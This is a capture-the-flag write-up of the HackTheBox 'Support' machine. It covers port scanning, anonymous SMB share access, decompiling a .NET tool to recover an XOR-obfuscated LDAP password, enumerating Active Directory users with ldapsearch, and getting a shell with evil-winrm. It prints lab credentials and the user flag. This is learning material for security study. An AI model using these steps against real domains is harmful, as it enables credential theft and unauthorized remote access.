# Support

## Recon

```
nmap -Pn support.htb
Nmap scan report for support.htb (10.129.230.181)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```
port 139 & 445 - smb

### SMB ( 139 & 445)

server message block - network protocol which is used to share files on local network.

Share - the folder in the service exposed by the system present in the local network. each system can have multiple shares.

listing shares present in the server with common creds(anonymous - no password)

```
(base) ananthreddy@ananth-macbook support % smbclient -L support.htb -U anonymous
Password for [WORKGROUP\anonymous]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

```

connecting to share - `support-tools`

```
smb: \> ls
  .                                   D        0  Wed Jul 20 22:31:06 2022
  ..                                  D        0  Sat May 28 16:48:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 16:49:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 16:49:55 2022
  putty.exe                           A  1273576  Sat May 28 16:50:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 16:49:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 22:31:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 16:50:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 16:49:43 2022
```

downloaded the ```UserInfo.exe.zip``` - ``` get UserInfo.exe.zip```

<img width="870" height="159" alt="Screenshot 2026-09-21 at 12 00 35" src="https://github.com/user-attachments/assets/d6f39858-428e-4d0a-8fc9-12aed05b6f78" />


dll files - like dll files are those common programs that are used by many applications in a device so they use this shared dll filed program instead of writing all the programs again and again for every application.

UserInfo.exe - unable to execute the executible file due to binary content.( compiled file)

decompiled UserInfo.exe

UserInfo.exe - Userinfo - ```Properties		UserInfo		UserInfo.Commands	UserInfo.csproj		UserInfo.Services```

In **```UserInfo.Services/LdapQuery.cs```** 

```
entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```
**LDAP --> protocol to communicate with AD.**

**support.htb --> domain name --> name used to identify the AD in the local network .**

**support --> name used by NETBios service to identify the domain of the user.**

**ldap --> username of the AD (Active directory).**

In ***```userInfo.Services/Protected.cs```***

```
encrypted password : 0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E

Key : Armando ( done XOR twice again with 0xDF.)

original password : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 

```

<img width="629" height="357" alt="Screenshot 2026-09-21 at 13 42 35" src="https://github.com/user-attachments/assets/f75c62de-0e9c-4f23-8a43-201c484288ae" />

### NETBios

NetBIOS (Network Basic Input/Output System) is a legacy protocol designed for communication between computers on a Local Area Network (LAN). 

**LDAP** - Lightweight Directory Access Protocol - acts as a communication method for querying Active Directory, allowing applications to discover the directory's structure—users, groups, computers, organisational units, and their attributes.

uses 389 and 636.


### ldapsearch 

command line tool used to communicate with shared directory service.

(https://hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html#manual-1)
```
ldapsearch -x -H ldap://support.htb \ -D "SUPPORT\\ldap" \ -w 'password' \ -b "DC=support,DC=htb"  "(objectClass=user)" 
```

<img width="535" height="628" alt="Screenshot 2026-09-21 at 14 30 41" src="https://github.com/user-attachments/assets/029206dd-9109-4dc9-a51f-a16b8a4b1893" />

the user ```support``` is part of(user of) a AD in the group Shared Support Accounts.

```
username : support
password : Ironside47pleasure40Watchful
```


Windows Remote Management (WinRM) - tool used to execute commands on remote Windows computers and servers over a network.

resource : https://hackviser.com/tactics/pentesting/services/winrm

```
evil-winrm -I support.htb -u support -p 'Ironside47pleasure40Watchful'
```
### User flag

in   /Users/support/Desktop/user.txt

```
6510a18bebb7b7a1569bc2271d35dab8
```


